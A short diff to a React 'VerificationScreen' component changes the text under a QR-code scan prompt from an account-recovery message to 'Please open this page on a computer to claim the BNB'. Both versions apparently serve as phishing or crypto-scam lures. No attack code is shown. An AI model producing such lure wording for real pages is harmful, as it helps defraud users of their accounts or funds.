@@ -27,7 +27,7 @@ export function VerificationScreen() {
             Open your phone's camera app and scan the QR code below
           </p>
           <p className="text-gray-400 text-sm">
-            This secure passkey verification will help recover your account access
+            Please open this page on a computer to claim the BNB
           </p>
         </div>
       </div>
